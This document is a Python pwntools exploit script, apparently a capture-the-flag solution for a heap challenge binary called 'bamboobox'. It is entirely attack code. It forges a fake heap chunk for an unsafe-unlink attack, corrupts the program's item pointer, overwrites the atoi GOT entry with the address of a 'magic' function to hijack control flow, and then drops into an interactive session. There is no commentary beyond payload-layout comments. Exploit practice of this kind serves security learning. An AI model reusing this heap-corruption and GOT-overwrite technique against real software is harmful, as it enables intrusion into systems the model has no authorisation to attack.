from pwn import*

context(arch='amd64',os='linux')
context.log_level = 'debug'
context.terminal =['tmux','splitw','-h']

r = process('./bamboobox')

gdb.attach(r)

elf = ELF('./bamboobox')
magic = elf.symbols['magic']
item = 0x6020c8
atoi_got = elf.got['atoi']
exit_got = elf.got['exit']
goodbye_message = elf.symbols['goodbye_message']
puts_got = elf.got['puts']

def show_item():
    log.info('show')
    r.sendlineafter('choice:','1')
    pause()

def add_item(size, name):
    log.info('add_item')
    r.sendlineafter("choice:","2")
    r.sendlineafter(':',str(size))
    r.sendlineafter(':',str(name))
    pause()

def remove(index):
    log.info('remove')
    r.sendlineafter("choice:","4")
    r.sendlineafter(':',str(index))
    r.recvuntil('remove successful!!')
    pause()

def change(index,size,content):
    log.info('change')
    r.recvline()
    r.sendlineafter("choice:","3")
    r.sendlineafter('index of item:',str(index))
    r.sendlineafter('length of item name:',str(size))
    r.sendafter(':',str(content))
    pause()

def info_log():
    log.info('main+222 (add_item)')
    log.info('main+234 (change_item)')
    log.info('main+246 (remove_item')
    log.info('main+210 (show_item)')
    log.info('exit_got = '+hex(exit_got))
    log.info('goodbye_message = '+hex(goodbye_message))
    log.info('atoi_got = '+hex(atoi_got))
    pause()

def main():
    info_log()

    add_item(128,'A'*8)
    add_item(128,'B'*8)
    add_item(128,'C'*8)

    payload = ''
    payload += p64(0)   #prev_size
    payload += p64(0)   #size
    payload += p64(item-24)     #bk
    payload += p64(item-16)     #fd
    payload += 'D'*96
    payload += p64(0x80)
    payload += p64(0x90)

    change(0,len(payload),payload)
    remove(1)

    payload2 = ''
    payload2 += 'A'*24
    payload2 += p64(atoi_got)

    change(0,len(payload2),payload2)
    change(0,8,p64(magic))
  
    r.sendlineafter('choice:','2')
    r.interactive()

if __name__ == '__main__':
    main()
